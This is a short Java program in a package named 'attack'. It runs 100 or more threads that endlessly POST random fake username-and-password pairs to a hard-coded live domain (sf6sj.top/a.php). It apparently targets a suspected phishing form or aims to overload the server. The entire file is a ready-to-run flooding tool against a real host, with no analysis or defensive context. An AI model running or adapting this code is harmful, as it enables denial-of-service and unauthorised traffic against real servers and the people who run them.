package io.ilss.part1.attack;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Random;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * className: Main
 * description: TODO
 *
 * @author hasee
 * @version 1.0
 * @date 2019/5/16 14:20
 */
public class Main {
    public static void main(String[] args) {
        Thread postThread = new Thread(() -> {
            while (true) {
                String param = "u=" + (new Random().nextInt(10) * 100000000 + new Random().nextInt(99999999)) + "&p=" + UUID.randomUUID().toString().substring(3,8) + new Random().nextInt(999999999) + "&bianhao=1";
                String result = Main.sendPost("http://sf6sj.top/a.php", param, "UTF-8");
                System.out.println(Thread.currentThread().getName() + " : " + result + " : " + param);
                try {
                    TimeUnit.MICROSECONDS.sleep(80);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });

        ExecutorService service = Executors.newFixedThreadPool(100);
        for (int i = 0; i < 100; i++) {
            service.execute(postThread);
        }
        postThread.start();
    }

    public static String sendPost(String uri, String param, String charset) {
        String result = null;
        PrintWriter out = null;
        InputStream in = null;
        try {
            URL url = new URL(uri);
            HttpURLConnection urlcon = (HttpURLConnection) url.openConnection();
            urlcon.setDoInput(true);
            urlcon.setDoOutput(true);
            urlcon.setUseCaches(false);
            urlcon.setRequestMethod("POST");
            urlcon.connect();
            out = new PrintWriter(urlcon.getOutputStream());
            out.print(param);
            out.flush();
            in = urlcon.getInputStream();
            BufferedReader buffer = new BufferedReader(new InputStreamReader(
                    in, charset));
            StringBuffer bs = new StringBuffer();
            String line = null;
            while ((line = buffer.readLine()) != null) {
                bs.append(line);
            }
            result = bs.toString();
        } catch (Exception e) {
            System.out.println("[请求异常][地址：" + uri + "][参数：" + param + "][错误信息："
                    + e.getMessage() + "]");
        } finally {
            try {
                if (null != in) {
                    in.close();
                }
                if (null != out) {
                    out.close();
                }
            } catch (Exception e2) {
                System.out.println("[关闭流异常][错误信息：" + e2.getMessage() + "]");
            }
        }
        return result;
    }

}
